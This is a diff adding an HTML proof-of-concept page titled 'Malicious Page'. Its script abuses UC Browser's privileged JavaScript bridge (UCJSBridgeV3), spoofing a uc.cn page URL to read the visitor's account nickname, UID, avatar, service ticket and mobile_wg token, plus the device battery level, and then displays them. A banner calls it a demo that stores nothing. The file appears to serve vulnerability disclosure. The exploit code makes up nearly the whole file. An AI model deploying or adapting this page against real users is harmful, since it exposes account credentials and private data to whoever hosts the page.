@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" charset="UTF-8">
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        .container {
+            width: 100%;
+            padding: 15px;
+        }
+
+        @media screen and (min-width: 700px) {
+            .container {
+                width: 70%;
+                margin: auto;
+            }
+        }
+
+        p {
+            white-space: pre-wrap; 
+            word-wrap: break-word; 
+            overflow-wrap: break-word; 
+        }
+
+        .bold-and-larger {
+            font-weight: bold; 
+            font-size: 1.5em; 
+        }
+
+        .larger {
+            font-weight: bold; 
+            font-size: 1.2em; 
+        }
+
+    </style>
+    <title>Malicious Page</title>
+
+</head>
+
+
+<body>
+    <h1>Malicious Page</h1>
+
+    <p>!!! This is just a demo page, NO Sensitive Data will be stored!!!</p>
+
+    <p><span class="bold-and-larger">An attacker can:</span></p>
+
+    <p><span class="larger">Get Your UC Account Info:</span></p>
+    <p style="font-size: 15px;" id="AccountNickname"></p>
+    <p style="font-size: 15px;" id="AccountAvatarText">Your UC Avatar: </p>
+    <div class="image-with-text">
+        <img id="AccountAvatar" src="" alt="" width="30%" height="auto">
+    </div>
+    <p style="font-size: 15px;" id="AccountUid"></p>
+    <p style="font-size: 15px;" id="AccountTicket"></p> 
+    <p style="font-size: 15px;" id="AccountMobileWG"></p> 
+
+    <p><span class="larger">Get Your Device Battery Info:</span></p>
+    <p style="font-size: 15px;" id="Battery"></p>
+
+    <script>
+        
+    var r = +new Date;
+    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+        invokeId: "callback",
+        methodName: "account.getUserInfo",
+        methodParams: {vCode: r},
+        pageURL: "https://www.uc.cn/",
+        windowId: window.ucapi.windowId
+    }).then(function(a) {
+        var json = a;
+
+        var AccountNickname = json.nickname;
+        document.getElementById("AccountNickname").innerText = "Your UC Account Nickname: " + AccountNickname;
+
+        var Avatar = json.avatar_url;
+        document.getElementById("AccountAvatar").src = Avatar;
+        
+        var AccountUid = json.uId;
+        document.getElementById("AccountUid").innerText = "Your UC Account UID: " + AccountUid;
+
+        var AccountTicket = json.service_ticket;
+        document.getElementById("AccountTicket").innerText = "Your UC Account Ticket: " + AccountTicket;
+
+        var AccountMobileWG = json.mobile_wg;
+        document.getElementById("AccountMobileWG").innerText = "Your UC Account Mobile_wg: " + AccountMobileWG;
+    });
+
+    window.webkit.messageHandlers.UCJSBridgeV3.postMessage({
+        invokeId: "callback",
+        methodName: "device.batteryLevel",
+        methodParams: {
+        },
+        pageURL: "https://www.uc.cn/",
+        windowId: window.ucapi.windowId
+    }).then(function(a) {
+        var json = a;
+        var level = json.level;
+        document.getElementById("Battery").innerText = "Your Device Battery Level: \n" + level + "%";
+    });
+
+    </script>
+
+</body>
+
+</html>
